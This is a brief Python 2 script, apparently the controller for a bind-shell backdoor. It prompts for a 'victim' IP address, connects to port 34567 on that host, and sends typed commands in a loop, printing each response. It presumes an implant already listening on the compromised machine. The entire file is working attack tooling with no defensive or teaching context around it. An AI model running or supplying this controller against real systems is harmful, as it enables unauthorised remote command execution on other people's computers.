import socket

def main():
    victimIP=raw_input("Input Victim IP : ")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((victimIP, 34567))
    print "[+] Connected ", victimIP
    while(1):
        command=raw_input("\nInput Command : ")
        s.send(command)
        if((command=="Quit") or (command=="quit") or (command=="Q") or (command=="q")):
            break;
        data=s.recv(10000)
        print data
    s.close()

if __name__=="__main__":
    main()